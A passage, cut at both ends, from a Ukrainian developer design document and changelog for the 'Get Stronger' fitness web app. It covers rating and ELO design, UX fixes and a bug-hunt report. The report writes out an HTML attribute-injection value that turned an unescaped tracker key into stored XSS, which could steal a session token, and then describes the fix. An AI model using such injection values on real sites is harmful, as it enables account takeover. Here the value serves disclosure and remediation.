того, як людина взагалі відкрила Rating) виглядали б як щойно
підроблені — і Rating рахував би це так само суворо, як шахрайство.
Це реальний баг, знайдений і виправлений під час перевірки, не
теоретичний. Фікс — `RatingCore.seedSeen(history)`: коли для профілю
ще немає ні `ratingLog`, ні `ratingSeen` (перший запуск), кожен факт
засівається ЙОГО ВЛАСНОЮ датою, а не сьогоднішньою. Усі наступні
факти (додані ПІСЛЯ першого запуску) ідуть через звичайний `tick()` і
підпадають під грейс-вікно як завжди — живе шахрайство в уже
встановленому профілі захищене без змін.

Чесно про залишковий компроміс: перший запуск теоретично можна
обійти, якщо сфабрикувати «ідеальну» історію одразу за всіма
чотирма сигналами (не просто клік по теплокарті, а ще й харчування,
й ваги) ДО першого відкриття «Сьогодні»/`rating.html`. Це разова дія,
що потребує значно більше зусиль, ніж клік по кільком клітинкам, і
працює рівно один раз на профіль — «без банківського анти-читу»
(§6 вимоги) свідомо не намагається закрити й цю щілину: як і будь-який
клієнтський застосунок, Get Stronger не захищений від людини, що редагує свій
власний localStorage напряму, і це поза межами розумного тут.

### Історія Rating

`profile.ratingLog`: `{ 'YYYY-MM-DD': {rating, delta, quality, reasons} }`
— один запис на кожен день від першого факту до сьогодні.
`RatingCore.ratingStats(log, periodDays, now)` фільтрує за періодом і
рахує `current`/`change`/`max`/`min`/`series` — той самий патерн, що
`ProgressCore.bodyStats` на «Прогресі». `rating.html` дає перемикач
7/30/90/все (`PERIODS`, той самий підхід, що `journal.js`) і малює
графік ручним SVG-шляхом, без бібліотек — як решта графіків сайту.

### Перерахунок — `ratingLog` це КЕШ, не джерело правди

`profile.rating = 5234` як єдиний запис ніде не зберігається.
`RatingCore.recompute(history, seen, throughDate, cfg, proteinTarget)`
завжди будує весь `ratingLog` заново зі СПРАВЖНІХ даних
(`workLog`/`sessionLog`/`weightLog`/`bodyLog`/`mealLog` + `ratingSeen`),
з обмеженням `MAX_DAYS = 1500` (запобіжник, не для реальних профілів).
Це означає: імпорт профілю, зміна історичних записів, майбутня зміна
формули (`RATING_ALGORITHM_VERSION`, зараз `1`) — усе просто перерахує
`ratingLog` наново без ручного втручання. Сторінки (`js/today.js`,
`js/rating.js`) викликають `recompute()` при КОЖНОМУ відкритті (дешево,
детерміновано) і пишуть патч у профіль лише якщо результат справді
змінився — щоб звичайний перегляд сторінки не бомбардував мережу
однаковими збереженнями.

### Дані: SCHEMA_VERSION 3 → 4

`migrate()` додає типобезпечні порожні `ratingLog: {}`,
`ratingSeen: {}`, `ratingAlgorithmVersion: 0` — без спроби порахувати
перший `ratingLog` тут-таки: `recompute()` потребує `window.HistoryCore`
(є лише на сторінках, не в `store.js`) і відпрацьовує сам при першому
відкритті «Сьогодні» чи `rating.html`. `js/account.js` розширено
відповідними ключами й структурними валідаторами імпорту — той самий
принцип «форма перевіряється, невідоме відкидається поіменно», що для
`weightLog`/`trackerLog`.

### UI: компактно на «Сьогодні», деталі на `rating.html`

«Сьогодні» показує лише те, що читається за секунду (§13): рівень,
число, прогрес-бар, причина сьогоднішньої зміни одним рядком.
`rating.html` — повна картина: заголовок з прогресом до наступного
рівня, розклад «Що вплинуло на рейтинг сьогодні» з очками по кожному
пункту, графік у часі, драбина 10 рівнів (переграний `.vol-list`,
завершені рівні — штрихована заливка, як «вичерпаний обʼєм» на
«Моєму плані», щоб не вигадувати нову візуальну мову).

Свідомий вибір: `rating.html` лежить під «Інше» в навігації, як
`trackers.html` у Stage 4 — щоб не займати основний рівень шапки й не
чіпати відлагоджену математику breakpoint 1060px (розділ 12).

### Підготовлено для гейміфікації, не побудовано

`recompute()` повертає `events`: `rating.levelUp` (перетин порога рівня)
і `rating.personalBest` (новий максимум Rating за весь час). Це чисті
дані, доступні для майбутнього окремого етапу гейміфікації. Єдине, що
з ними робиться зараз, — скромний текстовий тост при підвищенні рівня
(`toast()`, без анімацій і фанфар), і то лише один раз: сторінка звіряє,
чи сьогоднішній запис уже існував у кеші профілю ДО перерахунку, щоб не
показувати той самий тост при кожному оновленні сторінки того самого
дня. Жодних досягнень, медалей, скінів, XP-панелі, звуків — це окремий,
останній етап (§15 вимоги).

> `rating-core.js`. Опис нижче лишається як документація рішень.

`tests/rating-core.test.js`, 41 тест: розрахунок і детермінізм

### Свідомо залишено для наступних етапів

Apple Health/сон/recovery/звички як окремі rating-сигнали (архітектура
готова — новий сигнал це нова функція + нова вага в `RATING_CONFIG` +
рядок у `dailySignals()`, існуючі сигнали не зміняться), будь-яка
гейміфікація навколо `rating.levelUp`/`rating.personalBest` (медалі,
анімації, звуки, скіни), лідерборд і соціальні функції (свідомо й
навмисно — Rating залишається особистим), більш точна білкова ціль
по днях в історії (наразі — чесно назване наближення поточною ціллю).

## 11д. Сезонний ELO, акаунти та продакшн (етап 6)

Стару локальну Get Stronger Rating замінила **сезонна змагальна система** з
реальним бекендом (Supabase) і продакшн-деплоєм на Vercel.

### Модель

**Чисел балансу тут немає навмисно.** Перший варіант цього розділу
переказував конфіг словами — «шкала 0–2500», «по 200 ELO», «Elite Zone
2000–2500», «бюджет 200 ELO на тиждень», «максимум +45 на день». Після
перебалансу `elo_pace_level_curve` (вересень 2026) жодне з тих чисел уже
не було правдою, і документ про це не дізнався. Тому тут лишились ПРАВИЛА,
а числа живуть в одному місці — `db/elo-config.json`, звідки їх беруть і
сервер, і клієнт, і довідка.

- **Шкала від нуля до стелі сезону.** Рівні рівномірні, їх `levelCount`;
  за порогом `eliteFloor` — **Elite Zone**, де рівень уже не росте.
- **4 сезони на рік:** SPRING (03–05), SUMMER (06–08), AUTUMN (09–11),
  WINTER (12–02, рік — за груднем). Кожен сезон стартує з 0; історія
  сезонів і нагороди — назавжди (`season_history`, `awards`).
- **ELO дають лише факти, не користування застосунком.** Тижневий бюджет
  ділиться між категоріями (тренування, харчування, сон, відновлення,
  активність) у частках із `weights`.
- **Персональна нормалізація:** план 4/тиж, виконаний повністю, дорівнює
  плану 6/тиж, виконаному повністю — дельта за тренування ділиться на
  кількість планових днів.
- **Толеранс-зони, не бінарність:** влучив у ціль — повна дельта, далі
  драбина коефіцієнтів аж до символічної частки за «хоч щось».
- **Денні межі:** є стеля й підлога дня, бонуси за «чистий день» і
  «чистий тиждень», штраф за пропущене планове тренування (тижнева
  оцінка) і за «відкритий» день харчування.
- **Grace Weeks:** кілька блоків по тижню на сезон — вмикаєш явно, штрафи
  не нараховуються (позитив — так). Лікарняні/відпустки.
- **Стеля майже недосяжна:** симуляція (`tools/simelo.mjs`, 5 профілів ×
  5 сідів + бездоганний прогін) перевіряє 6 цілей балансу проти
  `db/elo-config.json` і мусить лишатись 6/6. Правити баланс = правити
  той файл, а не цей текст.

### Архітектура довіри

Сервер — єдине джерело правди: всі записи йдуть через RPC `elo_submit`
(security definer) з ідемпотентністю за `action_key`, вікном сабміту
(2 дні назад, 1 вперед), денними кепами та clamp 0–2500 на боці SQL.
Клієнт показує оптимістичну дельту тим самим кодом (`js/elo-core.js`
математично еквівалентний SQL — закрито тестом паритету 11/11), офлайн
складає події в чергу і досилає. RLS: свій рядок бачиш сам; лідерборд —
окремий view лише з імʼям, ELO і місцем. Ліміт чесності: сервер вірить
фактам клієнта в межах кепів (антично жорсткіше для локального застосунку
зробити неможливо), тож захист — кепи + ідемпотентність + журнал подій.

### Продакшн

Сайт задеплоєно на Vercel (статичні файли + `js/config.js` з URL і
публічним anon-ключем Supabase; безпека тримається на RLS, не на
секретності ключа). Реєстрація — email+пароль через Supabase Auth.
У локальному режимі (file:// або без конфіга) сезонний ELO чесно
вимкнений: бейдж схований, сторінка «Сезон» пояснює причину.

### Читальна частина рейтингу (вересень 2026)

Сервер віддавав більше, ніж показувалось. `elo_recent` несе категорію і
`elo_after` на кожну подію, `elo_history` — категорії з якістю
виконання, активні дні, витрачені Grace Weeks, найкращий і найгірший
день сезону. З цього на екрані не було НІЧОГО: стрічка подій друкувала
«причина · дата · дельта», а історія сезонів — один рядок на сезон.

Зміни, і чому саме такі.

**Стрічка подій згортається і памʼятає вибір.** Це єдине місце, де видно,
за що прийшло число, але потрібне воно раз на тиждень, а місця займало
найбільше на сторінці: чотирнадцять рядків між шапкою й таблицею
лідерів. Компонент узято готовий — той самий `.acc` +
`App.initAccordions`, що згортає довгі пояснення по всьому сайту. Стан
лежить у `ib.elo.events.open`: без памʼяті зміна марна — людина закриває
стрічку й наступного дня бачить її знову відкритою.

Голова акордеона каже підсумок (`+N ELO за тиждень · M подій за K днів`),
а не лише назву: заголовок над згорнутим тілом не повідомляє нічого, його
доводилось відкривати, щоб дізнатись, чи є там узагалі щось.

**Події згорнуті в ДНІ.** Дата стояла в кожному рядку, хоч стосується
дня, а не події; три події одного дня читались як три різні дні. Тепер у
дня є свій підсумок і свій рахунок на кінець, а в рядку — категорія
(включно зі «Штраф» і «Бонус»: саме їх без підпису й не зрозуміти) і
рахунок після події. Групування — `EloView.groupByDay`
(`js/elo-view-core.js`), під юніт-тестами.

Одна пастка тут своя: тижневу оцінку сервер пише з `elo_after = 0` — це
підсумок тижня, а не стан рахунку. Друкувати той нуль означало б
написати людині, що вона обнулилась, тому рахунок беруть із першої
події дня, у якої він справжній.

**Плитки «нагород» і «сезонів завершено» стали входами.** Числа, після
яких одразу виникає «а які саме», були мертвими: вітрина нагород
існувала, а дороги до неї з цього місця не було. Тепер це посилання
(`.kpi--link`) на `awards.html` і `seasons.html`.

**Вітрина нагород переїхала в самий низ `rating.html`.** Досі вона була
хвостом картки «Історія сезонів» — тобто відповіддю на питання, якого в
тому місці ніхто не ставить. Рейтинг читають зверху вниз: скільки в мене
зараз, як іде тиждень, де я в таблиці. Нагороди не відповідають ні на що
з цього — вони про вже пройдене.

**Рідкість: назви англійською, підпису на картці немає.**
`Common → Uncommon → Rare → Epic → Mythic → Unique → Gold → Legendary` —
шкала, порядок якої видно без порівнювання слів; українські відповідники
доводилось звіряти між собою («Міфічна вище за Унікальну?»).

Саме слово з картки прибрано повністю — спершу з лиця, потім і зі
звороту. Колір лиця і Є відповіддю на «наскільки рідкісна», він
читається швидше за будь-який текст, а підпис поруч із ним — це те саме
твердження вдруге. Доступність від цього не страждає: рідкість їде в
`aria-label` разом з обома сторонами картки, тобто той, хто кольору не
бачить, отримує її першим, а не після перевороту. Повний перелік
сходинок із кольорами лишається в довідці розділу «Нагороди».

**Зі звороту прибрано й знак Get Stronger.** Шестерня з бігуном
відповідала на «хто це видав» — питання, якого ніхто не ставить,
перевернувши власну нагороду. Займала вона при цьому пів картки й була
однакова на всіх восьми сходинках, тобто не розрізняла нічого: два
перевернуті звороти виглядали однаково, доки не прочитаєш підпис. На
звороті лишилось те, заради чого його й перевертають: назва і коли.
Функція `Award.gearIcon` видалена разом із розміткою — мертвий код у
модулі, який стережуть тести, живе довго.

### `seasons.html` — розбір завершених сезонів

Окрема сторінка, бо питання інше. Рейтинг відповідає на «скільки в мене
ЗАРАЗ», а «як я пройшов минулі сезони» виникає раз на квартал — і місце
на щоденному екрані займало щодня.

Що на ній:

1. **Поточний сезон** — день X із Y, ELO, рівень, частка від стелі,
   місце, Grace, і головне: **коли зʼявиться підсумок**. Сезон
   закінчується в неділю, а сервер підбиває підсумок пізніше — чекає
   `submitWindowDays` на дії, надіслані офлайн (`elo_close_season` не
   закриє сезон раніше). Без цього рядка людина приходить у понеділок,
   не бачить свого сезону в історії й вважає це поламаним.
2. **Підсумки за весь час** — шість чисел, не дванадцять: сезонів,
   найкраще ELO, найкраще місце, сезонів у ELITE, активних днів,
   середнє ELO. Прочерк, а не нуль: «найкраще місце 0» виглядало б як
   перше місце, і навіть краще за нього.
3. **Драбина сезонів** — по горизонтальній смузі на сезон, поточний
   позначений словом «зараз».
4. **Розбір кожного сезону** — акордеон, розгорнутий лише найновіший:
   місце й відсоток, активні дні, Grace, категорії з якістю виконання,
   екстремуми днів і **нагороди саме цього сезону**.

**Чому смуги, а не графік.** Правило проєкту — «графік це лінія, а
стовпчиків немає ніде» (§14), і причина правила в тому, що жоден показник
Get Stronger не має осмисленого нуля в масштабі свого графіка. Драбина
сезонів — не графік: нуль тут справжній (кожен сезон стартує з 0 ELO),
стеля справжня (`seasonMax` однаковий для всіх сезонів), і питання
«наскільки я вибрав сезон» — про частку, а не про зміну в часі. Тобто це
рівно той випадок, який правило й виключає: та сама форма, що `.vol__bar`
у раціоні, взята як є. Додатковий аргумент — розмір даних: сезонів чотири
на рік, і лінія з двох-трьох точок не показує тренду, а дві смуги
відповідають одразу.

Арифметика — у чистому ядрі `js/elo-view-core.js` (`seasonStats`,
`seasonLadder`), бо висота/ширина смуги — це ТВЕРДЖЕННЯ про дані:
«удвічі довша» мусить означати «удвічі більше ELO», і перевірити це можна
лише там, де є тест. Екран стереже `tools/verifyseasons.mjs` — 70
перевірок, серед них порівняння ширини смуги з очікуваною в пікселях.

## 11е. Етап 7: цілісний продукт замість набору сторінок

Етап без нових функцій. Мета — щоб Get Stronger відчувався як інструмент, який
відкривають щодня, а не як сайт із калькуляторами.

### «Обране» повністю видалено

Функція з етапу 6 прибрана з кодової бази цілком, а не схована: сторінка,
`js/favorites-core.js`, `js/favorites.js`, зірочки на «Сьогодні», у
програмах і рецептах, універсальна зірочка сторінки, CSS, пункти
навігації, поле профілю, гілка валідатора імпорту й тести.

Одне місце лишилось навмисно — `migrate()` у `js/store.js`:

```js
if (p.favorites !== undefined) delete p.favorites;
```

**Без версійного гейта.** Профілі, що вже дійшли до `version 5`, жодного
кроку міграції більше не проходять, а поле в них лежить; імпорт старого
експорту приносить його знову. Мовчазне воскресіння ключа, якого код більше
не знає, гірше за один рядок нормалізації. Номер версії 5 лишається
зайнятим назавжди — перевикористати його під щось інше не можна, бо ті самі
профілі пропустили б новий крок.

### Що виправлено в мобільному UX

| Проблема | Було | Стало |
|---|---|---|
| Меню в бургері | нижні пункти недосяжні (див. розділ 12) | скролиться, `dvh` |
| Таблиця плану | ~600px усередині картки на 302px | складається у стовпчик карток |
| Шкала 1..10 | 10×34px рвались на 7+3 | сітка 5×2, висота 44px |
| `.icon-btn` | 30×30px, проміжок 5px | зона дотику 44px, проміжок 8px |
| Клітинка теплокарти | 24×24px, шрифт 9,9px | 32×32px, 0,74rem |
| Кнопки вікна раціону | під екранною клавіатурою | липкі до низу вікна |
| Тост і таймер відпочинку | та сама точка екрана | тости піднімаються над таймером |
| Довідник продуктів | вкладений скролер на пів-екрана | без обмеження висоти |
| `.grid-*` | `minmax(280px, 1fr)` вилазив за батька | `minmax(min(280px, 100%), 1fr)` |
| Відгук на дотик | лише `:hover`, якого на тачі немає | `:active` на всіх дотикових |

Складання таблиці плану зроблене **тільки показом**: розмітка лишається
`<table>`, комірки отримали `data-l` із підписом колонки, а CSS під 640px
перемикає її на блоки й підставляє підпис через `::before`. Десктоп, друк і
читалки бачать ту саму структуру. Селектори навмисно `table.tbl--plan`, а не
`.tbl--plan`: базові правила записані як `table.tbl td` і за специфічністю
перемагали б коротший селектор — рамки протікали б крізь нові правила.

### Друк

До цього етапу `@media print` містив один рядок (`body { background:#fff }`),
який нічого не давав: майже кожен елемент бере колір із власної змінної, тож
текст лишався майже білим на білому. Тепер друк — окремий блок **у кінці**
файла (тематичний шар нижче перевизначає ті самі змінні; якби друк ішов до
нього, тема забирала б свої темні значення назад).

Що робить блок: перевизначає палітру через змінні, ховає навігацію, футер,
кнопки й декор, розгортає згорнуті акордеони (`grid-template-rows: 1fr`,
`visibility: visible`) і `.reveal` (усе, повз що не гортали, друкувалось
порожнечею), знімає горизонтальний скрол таблиць, перетворює поля вводу на
підкреслені бланки, а галочку виконання — на порожню рамку під олівець.

Окремої кнопки «Друк» у Get Stronger немає: вона була зайвим елементом інтерфейсу
на трьох сторінках і дублювала штатний `Ctrl/Cmd + P`. Стилі друку лишилися —
браузерний друк далі дає чистий аркуш у зал.

### Синхронізація

Тости про «збережеться, коли зʼявиться мережа» показувались один раз і
зникали. Тепер у шапці є `.nav__sync` — маленька позначка, яка просто є,
поки `Store.pendingCount()` більший за нуль, і зникає сама. На телефоні
текст ховається, лишається крапка. Жодного модального вікна й жодного
повторного нагадування. Власної логіки синхронізації позначка не має.

### Micro-UX і консистентність

- `App.fmt()` — кома як десятковий роздільник у **показі**. Панель показувала
  «82,5 кг», а журнал за один клік звідти — «82.5 кг».
- `App.flashDone(btn, text)` — підтвердження на самій кнопці. Тост зʼявляється
  внизу екрана, а очі в цю мить на кнопці, яку щойно натиснули.
- `App.busy(btn, text)` — стан кнопки на час асинхронного збереження.
- Видалення вправи в редакторі плану тепер має **видиму** кнопку «Скасувати
  правку». Undo існував і раніше, але лише як Ctrl+Z — тобто був недоступний
  саме там, де потрібен: на телефоні в залі.
- Вимкнені кнопки пояснюють себе текстом, а не `title=` (на тач-екрані
  `title` не спрацьовує ніколи).
- Класи `.row--split`, `.row--split-center`, `.list-note` замість
  повторюваних inline-стилів.

### Робоча вага прямо на «Сьогодні»

Єдина цифра плану, яку міняють у залі між підходами. Раніше заради неї треба
було вийти на «Мій план», знайти той самий рядок і повернутись. Книга ваг
спільна на весь сайт (`profile.weights` за назвою вправи) і історія теж
(`HistoryCore.appendWeight`) — тож правка тут це та сама правка, що там.
Другої системи ваг не зʼявилось.

### Раціон

- Блок «День» піднятий над довідником продуктів: питання, з яким відкривають
  сторінку, — «що я вже зʼїв», а не «покажи таблицю на сотню позицій».
- У кожному прийомі — кнопка «**+ Додати продукт**». Прийом відомий із того,
  яку кнопку натиснули, тож лишається одне рішення: що саме й скільки.
  Механізм додавання той самий (пошук + те саме вікно), коротший лише вхід.
- Зміна кількості прийомів більше не мовчазна: `applySchema()` приймає
  необовʼязковий `report`, і сторінка каже «Прийомів стало 3. 2 позиції з
  прибраних перенесено до «Вечеря»». Сама логіка перенесення не змінена.

### Доступність

Escape у бургер-меню з поверненням фокуса; `aria-pressed` і `role="group"` на
шкалах 1..10; `aria-label` на полі трекера; `main:focus:not(:focus-visible)`
замість голого `outline:none` (після «До вмісту» не було видно, куди подівся
фокус); одна глобальна декларація `:focus-visible` замість двох конкуруючих;
повернення фокуса після закриття вікна раціону на поле швидкого додавання,
коли кнопка-відкривач уже перемальована.

### Перевірка

Крім `npm test` (213 модульних тестів) — чотири browser-прогони в
`tools/`: `verify7.mjs` (16 сторінок × 2 ширини: overflow, JS-помилки,
сліди «Обраного»), `verifydata.mjs` (21: міграції, legacy-поле, імпорт,
round-trip, offline), `verifya11y.mjs` (12), `verifyflows.mjs` (19:
наскрізні сценарії й друк).

## 11є. Фінальний Bug Hunt: що знайдено й виправлено

Прохід без нових функцій — тільки пошук і виправлення. Нижче лише те, що
було ВІДТВОРЕНО, а не запідозрено.

### P0 — критичні

**1. `recompute()` зациклювався в ніч переходу на зимовий час.**
`addDays` рахував крок як `+86 400 000 мс`. У ту добу локальний день триває
25 годин, тож від опівночі 26.10 крок потрапляв у 23:00 **того самого** дня —
ключ не мінявся, і `while (cursor <= through)` не завершувався ніколи.

Для застосунку українською це було не теоретично: `TZ=Europe/Kyiv`,
`addDays('2025-10-26', 1)` → `'2025-10-26'`. Будь-хто, чия історія починалась
раніше за 26.10.2025, отримував намертво зависле «Сьогодні» й `rating.html` —
`refreshRating()` виконується синхронно при завантаженні, до першого кадру.
Виправлення: `d.setDate(d.getDate() + n)`. Те саме — у `cutKey()`
`progress-core` і `tracker-core`. Регресійний тест ганяє реальні дати
переходів пʼяти зон.

**2. Збережений XSS через ключ трекера.**
`data-toggle="' + t.id + '"`, `id="val-' + t.id + '"` та ще пʼятнадцять місць
підставляли ключ у атрибути без `esc()`, а валідатор імпорту приймав будь-який
рядок до 80 символів. Файл із ключем

```
h" onfocus="…" autofocus x="
```

проходив **офіційний** імпорт JSON і виконував код на `trackers.html` і
`today.html`. У хмарному режимі поруч у localStorage лежить `ib.session` із
`refresh_token` — тобто повне захоплення акаунта.

Виправлено на двох рівнях: ключ трекера тепер мусить відповідати
`/^[A-Za-z0-9_-]{1,80}$/` (це і є формат, який видає `TrackerCore.addCustom`),
і всі підстановки загорнуті в `esc()`.

**3. Закрите мобільне меню перехоплювало дотики по сторінці.**
Меню ховалось лише прозорістю (`opacity: 0` + `pointer-events: none`), а
`.nav__drop` у мобільному блоці беззастережно повертав `pointer-events: auto`
і перекривав `none` батька. Невидима накладка заввишки 770 із 844 пікселів
ловила дотики: **реальний тап по кнопці в нижній частині «Раціону» відкривав
калькулятор 1ПМ**. Клавіатура так само проходила крізь сімнадцять невидимих
посилань.

Виправлення: закрите меню отримує `visibility: hidden` (прибирає і з
hit-testing, і з порядку табуляції), а `pointer-events: auto` для груп
звужено до `.nav__links.is-open .nav__drop`.

**4. 401/403 від Supabase знищував локальні дані.**
`clearSession()` разом із токеном прибирала `ib.profile` і `ib.pending`.
Сценарій: людина працює офлайн, патчі в черзі, локальний профіль свіжий →
мережа повертається → GET профілю → 403 (RLS, відкликаний токен,
призупинений проєкт) → стирається **єдина копія даних, яка ще нікуди не
доїхала**. Резервної копії немає: `ib.profile.backup` пишеться лише при
першому вході й імпорті.

Функція розділена: `clearSession()` забуває тільки токен, а
`clearIdentityData()` (профіль + черга) викликається виключно з `signOut`.

**5. `doSave` стирав щойно записану копію й рапортував «збережеться пізніше».**
Порядок був: записати localStorage → `ensureFresh()`. Невдале оновлення
токена викликало `clearSession()`, який тоді ще стирав профіль — тобто
копію, записану рядком вище. Далі патч ішов у чергу й кидалась помилка з
`.queued`, і кожна сторінка друкувала дружнє «збережеться пізніше».
Тепер `ensureFresh()` іде **до** запису.

**6. Дві сторінки писали дані, прочитані при завантаженні.**
`programs.js` не мала `Store.onChange` взагалі: `weights`, `weightLog` і
`customPlans` бралися один раз і писалися назад цілими обʼєктами. Робочу
вагу тепер правлять на «Сьогодні» — тож будь-яке «+2,5 кг» на відкритій
раніше вкладці стирало і нову вагу, і її запис в історії. Те саме в
`meals.js`: `persist()` завжди писав пару `{recipes, day}`, а `state.recipes`
оновлювалась тільки при завантаженні — рецепт, створений у сусідній вкладці,
знищувався першим-ліпшим додаванням продукту.

Додано підписки, які перечитують ці поля; `state.weights` тепер копія, а не
аліас (раніше він мутував кеш Store навіть при проваленому збереженні).

### P1 — важливі

- **Рейтинг міряв частоту відкривання застосунку.** Нарахування вимагає, щоб
  факт було «побачено» протягом двох днів (захист від заднього заповнення),
  але позначку ставили лише «Сьогодні» й `rating.html`. Тренування, відмічене
  в «Прогресі», або день їжі, закритий у «Раціоні», лишалися непоміченими.
  Виміряно на однаковій 200-денній історії: позначка щодня → **6170**,
  раз на 7 днів → **1727**, раз на 14 днів → **37**. Поведінка людини
  байдуже однакова. Тепер `RatingCore.stamp()` викликає той, хто пише факт
  (`App.stampRating` у тому ж патчі).
- **Бонус «харчування у межах цілі» показувався, але не нараховувався** —
  бракувало `score += pts`. Перелік причин не сходився з денною дельтою.
- **Бонус за рекорд був без стелі.** Один клік «Додати +10%» пише новий запис
  усій книзі ваг: десять вправ давали 80 очок і максимальну денну дельту без
  жодного тренування. Додано `prMaxPerDay: 2`.
- **Імпорт мовчки губив дані.** `sex` завжди відкидався (валідатор чекав
  `'m'/'f'`, застосунок пише `'male'/'female'` — жіночий профіль після
  відновлення рахувався за чоловічою формулою BMR); позначка «готове» у
  продуктів не переносилась (варений рис рахувався як сирий); зникали
  `url` рецепта, `title`/`focus` днів плану, `lift`/`circuit` вправ,
  `oneRM`/`stepPct` циклу; `deload.percent` читався як неіснуючий `pct`.
- **Один битий рядок відкидав увесь журнал.** Описка «520 кг» в одному записі
  повертала `reject` на весь `weightLog` — роки історії зникали, а
  повідомлення казало «Імпортовано полів: N». Тепер битий запис пропускається.
- **`null` для журналу проходив як успішний імпорт** і обнуляв історію.
  Тепер `null` чинний лише для скалярів (таблиця `NULLABLE`).
- **Обіцяного відкату імпорту не існувало.** Діалог казав «імпорт можна
  відкотити», копія писалась, кнопки не було ніде. Додано «Відкотити імпорт»
  (зʼявляється лише коли копія справді є).
- **`migrate()` не запускався для профілів без поля `version`.**
  `Object.assign(blankProfile(), stored)` підставляв поточну версію, і крок
  1→2 (засів `weightLog` із наявних `weights`) не спрацьовував ніколи —
  розділ «Сила» в «Прогресі» лишався порожнім назавжди.
- **`flushPending` знімав усю чергу після двох мережевих викликів**, зокрема
  й патч, доданий у цей проміжок — після того, як інтерфейс пообіцяв, що він
  у черзі. Тепер знімається рівно надіслане.
- **`pendingPush` ігнорував відмову запису.** При переповненому сховищі
  інтерфейс казав «збережеться, коли зʼявиться мережа», хоч патч не було
  записано нікуди.
- **Перемальовка стирала те, що набирають.** На «Сьогодні» автозбереження
  сесії (дебаунс 1,5 с) перемальовувало сторінку прямо під руками — набрана
  робоча вага зникала, фокус падав на `body`. У «Прогресі» умова
  `if (profile.bodyLog)` була істинною завжди (`{}` — теж істина), тож поле
  ваги очищалось від будь-якого збереження звідки завгодно.
- **День, підсвічений сесією, неможливо було зняти в теплокарті.**
  Перемикач умів лише `delete workLog[k]`, а `trained()` однаково бачив
  `sessionLog`. Тепер явний `0` перекриває сесію — і в `progress-core`, і
  в `rating-core`.

### P2 — помітні

- Числа поза межами лягали в профіль (вага 1000, вік 999) і назавжди
  знеструмлювали розрахунок калорій; сторінка акаунта при цьому показувала
  «6/6 для розрахунків». Тепер перевірка перед записом за
  `NutritionCalc.LIMITS`, а `coerce()` в акаунті клампить.
- Порожнє числове поле трекера записувало **нуль** (`Number('') === 0`
  проходив `Number.isFinite`). Тепер порожнє поле прибирає запис дня.
- Позиція з видаленим рецептом ставала невидимою й невидаляльною: рядок не
  малювався, кнопки ✕ не існувало, підсумок дня мовчки падав.
- `oneRepMax` був немонотонним: 100 кг × 22 давало 169,1 кг, × 23 — **157,5**.
  Санітарний фільтр відсівав окремі формули, і на 23 повтореннях їх випадало
  дві разом — медіана міняла спосіб обчислення. Тепер межа застосовується до
  результату, а не до кожної формули.
- `App.busy()` на кнопці рекорду 1ПМ був мертвим кодом: обробник — стрілкова
  функція, тож `this` дорівнював `undefined`.
- Подвійний клік у редакторі плану видаляв дві вправи: розмітка зі старими
  `data-i` лишалась на екрані, поки чекали на мережу. Тепер спершу показ,
  потім збереження.
- `saveProfileBeacon` слав запис повз чергу збережень; при незавершеному
  `saveProfile` два POST у той самий рядок ішли без гарантії порядку.
- «Стерти локальні дані» не чистила `forge.today` (галочки вправ) і мала
  описку в ключі згорнутих блоків.
- `boxing.html` і `supplements.html` не підключали `store.js` — бейдж рівня
  в шапці там лишався порожнім, а тема з профілю не застосовувалась.

### P3 — дрібні

`ratingStats().change` міряв на день менше (базою був перший день усередині
вікна, а не напередодні); вікна «за N днів» у `progress-core` були на день
ширші за ті самі вікна в `rating-core`; `recompute().min` завжди дорівнював
нулю; `rating.personalBest` спрацьовував на будь-якому позитивному дні;
«Зняти вибір» на `plan.html` не мав обробника відмови й мовчки нічого не
робив офлайн; видалення записів журналу ваги й трекера не питали підтвердження.

### Перевірка

`npm test` — 221 модульний тест, ганяється в чотирьох часових поясах
(частина помилок видима лише поза UTC). Плюс шість браузерних прогонів у
`tools/` (див. `tools/README-verify.md`): сторінки, дані, імпорт,
доступність, наскрізні сценарії, стійкість — разом 101 перевірка.

Прохід «стійкість» окремо ганяє десять варіантів **пошкодженого**
localStorage (биті типи, битий JSON, масив замість обʼєкта, версія з
майбутнього, план на неіснуючу програму, рецепт-привид, відʼємні й
величезні числа) по всіх шістнадцяти сторінках, швидкі повторні кліки,
`offline → зміна → reload → reconnect` і перехід між сторінками одразу
після вводу.

## 11ж. Production-аудит перед релізом (етап 9)

Останній етап нічого не додав. Він відповідав на одне питання: чи можна
показати Get Stronger живим людям і не боятися. Що знайшлось.

### Збірка була зламана

`npm run build:meta` падав із `ReferenceError: require is not defined`.
`package.json` має `"type": "module"`, а `tools/build-meta.js` був
написаний на CommonJS — тобто скрипт, який прошиває `canonical`, `og:url`
і `sitemap.xml` у розмітку, не запускався **жодного разу**. Сайт від
цього працював, але посилання на нього в месенджері відкривалось без
картки — рівно та проблема, заради якої скрипт існує.

Переведено на ESM (`import` + `import.meta.url` замість `__dirname`).
Заразом:

- у `sitemap.xml` не було `trackers.html` і `rating.html` — обидві
  індексовані, обидві просто забули внести;
- запуск із порожнім `siteUrl` знімав теги й видаляв `sitemap.xml`, але
  лишав у `robots.txt` рядок `Sitemap:` зі старим доменом — посилання на
  файл, якого вже немає. Тепер прибирається теж.

Перевірено обидва режими: з доменом (16 сторінок, 15 адрес у sitemap,
повторний запуск не дублює блок) і без нього.

### Get Stronger Rating рахувався квадратично

На профілі з двома роками історії `today.html` вантажилась 1,8 с при
чотириразовому уповільненні CPU (слабкий телефон). Профайлер показав, що
час іде не в саму формулу, а в підготовку даних: `trainedDates()`,
`closedMealDates()` і серії робочих ваг будувались і сортувались **заново
на кожен день перерахунку**. 730 днів × сортування 730 ключів × три
сигнали.

Набори залежать тільки від історії, не від дня. Тепер `recompute()`
рахує їх один раз на прогін (`deriveFacts()`) і передає всередину.
Свідомо без кешу між викликами: `journal.js` править `state.workLog[k]`
на місці, у тому ж обʼєкті, тож кеш за ідентичністю тихо застарівав би.

| історія | було | стало |
|---|---|---|
| 90 днів | 258 мс | 257 мс |
| 365 днів | 604 мс | 365 мс |
| 730 днів | 1822 мс | 513 мс |

Зростання з квадратичного стало лінійним. Числа не змінились — на це є
тест: поденний виклик `dailyDelta()` **без** переданих фактів має давати
той самий лог, що й швидкий `recompute()`, день у день, включно з
`quality` і накопиченим rating.

### Export → Clear → Import перевірено полем за полем

Раніше перевірялось «імпорт не падає». Тепер `tools/verifyroundtrip.mjs`
сідає повний профіль (60 днів історії, три трекери, власні правки плану,
рецепт, періодизація, делоад), тисне справжні кнопки на `account.html` і
звіряє 42 позиції. Найцінніша з них — не поле профілю: **Get Stronger Rating
